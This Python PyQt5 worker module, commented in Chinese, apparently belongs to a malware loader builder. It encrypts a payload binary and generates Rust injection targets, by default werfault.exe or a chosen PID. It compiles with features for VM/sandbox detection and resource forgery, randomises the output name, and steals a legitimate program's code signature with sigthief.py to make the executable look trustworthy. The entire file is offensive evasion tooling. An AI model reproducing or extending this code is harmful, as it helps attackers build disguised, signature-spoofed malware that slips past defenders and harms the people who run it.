"""
工作线程模块
负责在后台执行加密、构建和打包任务
"""
import os
import sys
import subprocess
import shutil
import platform
from PyQt5.QtCore import QThread, pyqtSignal
from .config_manager import (
    load_plugins_manifest,
    get_encryption_map,
    get_vm_checks_map,
    get_encryption_feature_map,
    get_run_mode_map,
    get_alloc_mem_feature_map,
    get_default_value
)


class WorkerThread(QThread):
    """
    后台工作线程，执行加密、编译、打包、签名等任务
    """
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    done_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)
    
    def __init__(self, parent, params):
        super().__init__(parent)
        self.params = params

    def run(self):
        """执行完整的构建流程"""
        try:
            self._encrypt_payload()
            self._update_icon_rc()
            self._generate_target_rs()
            self._build_rust_project()
            output_file = self._copy_output()
            if self.params['sign_enable']:
                self._sign_executable(output_file)
            self.progress_signal.emit(100)
            self.log_signal.emit('全部完成！')
            self.done_signal.emit(output_file)
        except Exception as e:
            self.error_signal.emit(str(e))

    def _encrypt_payload(self):
        """加密payload"""
        self.progress_signal.emit(0)
        self.log_signal.emit('加密中...')
        self.progress_signal.emit(10)
        
        # 从配置映射到 encrypt.py 所需方法名
        enc_map = get_encryption_map()
        enc_method_arg = enc_map.get(
            self.params['enc_method'], 
            self.params['enc_method']
        )
        
        enc_cmd = [
            sys.executable, 'encrypt.py',
            '-i', self.params['input_bin'],
            '-o', 'src/encrypt.bin',
            '-m', enc_method_arg
        ]
        
        result = subprocess.run(enc_cmd, capture_output=True, text=True, check=True)
        self.log_signal.emit(result.stdout)
        if result.stderr:
            self.log_signal.emit(result.stderr)
        
        self.progress_signal.emit(40)

    def _update_icon_rc(self):
        """更新icon.rc文件"""
        self.log_signal.emit('更新图标资源...')
        
        icon_path = self.params['icon_path']
        # 将反斜杠替换为正斜杠，以适应RC文件格式
        icon_path_normalized = icon_path.replace('\\', '/')
        template_path = os.path.join('templates', 'icon_rc.txt')
        
        with open(template_path, 'r') as f:
            template = f.read()
        
        icon_rc_content = template.format(icon_path_normalized)
        
        with open('icon.rc', 'w') as f:
            f.write(icon_rc_content)
        
        self.log_signal.emit(f'图标已设置为: {icon_path}')
        self.progress_signal.emit(50)

    def _generate_target_rs(self):
        """生成target.rs文件"""
        self.log_signal.emit('生成target.rs...')
        
        manifest = load_plugins_manifest()
        run_modes = manifest['run_modes']
        run_mode_id = self.params['run_mode']
        
        for rm in run_modes:
            if rm['id'] == run_mode_id:
                pattern = rm.get('pattern', 1)
                if pattern == 2:
                    template_path = os.path.join('templates', 'src_target2.txt')
                    with open(template_path, 'r') as f:
                        template = f.read()
                    target_program = self.params.get('target_program', r'C:\Windows\System32\werfault.exe')
                    content = template.format(target_program)
                    with open('src/target.rs', 'w') as f:
                        f.write(content)
                    self.log_signal.emit('已生成target.rs (TARGET_PROGRAM)')
                elif pattern == 3:
                    template_path = os.path.join('templates', 'src_target3.txt')
                    with open(template_path, 'r') as f:
                        template = f.read()
                    target_pid = self.params.get('target_pid', '0')
                    content = template.format(target_pid)
                    with open('src/target.rs', 'w') as f:
                        f.write(content)
                    self.log_signal.emit('已生成target.rs (TARGET_PID)')
                else:
                    self.log_signal.emit('无需生成target.rs')
                break
        
        self.progress_signal.emit(60)

    def _build_rust_project(self):
        """构建Rust项目"""
        self.log_signal.emit('Rust 构建中...')
        
        # 使用用户选择的target
        self.target = self.params.get('target', 'x86_64-pc-windows-msvc')

        
        # 动态生成Cargo feature参数
        features = self._build_features_list()
        features_str = ','.join(features)
        
        self.log_signal.emit(f'本次编译启用 features: {features_str}')
        self.log_signal.emit(f'编译目标: {self.target}')
        
        build_cmd = [
            'cargo', 'build', '--release',
            '--no-default-features',
            '--target', self.target,
            f'--features={features_str}'
        ]
        
        result = subprocess.run(build_cmd, capture_output=True, text=True, check=True)
        self.log_signal.emit(result.stdout)
        if result.stderr:
            self.log_signal.emit(result.stderr)
        
        self.progress_signal.emit(70)

    def _build_features_list(self):
        """构建features列表"""
        manifest = load_plugins_manifest()
        features = []
        
        # VM检测features
        vm_map = get_vm_checks_map()
        selected = self.params.get('vm_checks', '').split(',') if self.params.get('vm_checks') else []
        features.extend([vm_map[t] for t in selected if t in vm_map])
        
        # 加密方式feature
        enc_feature_map = get_encryption_feature_map()
        default_enc = get_default_value('encryption') or 'chacha20-aes'
        enc_feature = enc_feature_map.get(
            self.params.get('enc_method', default_enc),
            'decrypt_chacha20_aes'
        )
        features.append(enc_feature)
        
        # 运行模式feature
        run_map = get_run_mode_map()
        default_run = get_default_value('run_mode') or 'enum_ui'
        run_feature = run_map.get(
            self.params.get('run_mode', default_run),
            'run_enum_ui'
        )
        features.append(run_feature)
        
        # 内存分配方式feature
        mem_feature_map = get_alloc_mem_feature_map()
        default_mem = get_default_value('alloc_mem_mode') or 'alloc_mem_va'
        mem_mode = self.params.get('mem_mode', default_mem)
        mem_feature = mem_feature_map.get(mem_mode, 'alloc_mem_va')
        features.append(mem_feature)
        
        # 资源伪造
        if self.params.get('forgery_enable'):
            features.append('with_forgery')
        
        return features

    def _copy_output(self):
        """复制输出文件"""
        self.log_signal.emit('复制输出...')
        
        src_file = os.path.join('target', self.target, 'release', 'rsl.exe')
        out_dir = 'output'
        
        if not os.path.exists(out_dir):
            os.makedirs(out_dir)
        
        # 生成随机文件名
        import random
        import string
        rand_name = ''.join(random.choices(string.ascii_letters, k=6)) + '.exe'
        dst_file = os.path.join(out_dir, rand_name)
        
        if not os.path.exists(src_file):
            raise FileNotFoundError(src_file)
        
        shutil.copyfile(src_file, dst_file)
        self.log_signal.emit(f'已复制并重命名: {dst_file}')
        
        return dst_file

    def _sign_executable(self, dst_file):
        """伪造签名"""
        app_path = self.params['sign_app']
        if not app_path:
            raise ValueError('未选择被伪造应用的路径！')
        
        sign_out_file = dst_file[:-4] + '_signed.exe'
        sign_cmd = [
            sys.executable,
            os.path.join('sign', 'sigthief.py'),
            '-i', app_path,
            '-t', dst_file,
            '-o', sign_out_file
        ]
        
        result = subprocess.run(sign_cmd, capture_output=True, text=True, check=True)
        self.log_signal.emit(result.stdout)
        if result.stderr:
            self.log_signal.emit(result.stderr)
        
        shutil.move(sign_out_file, dst_file)
        self.log_signal.emit(f'伪造签名完成: {dst_file}')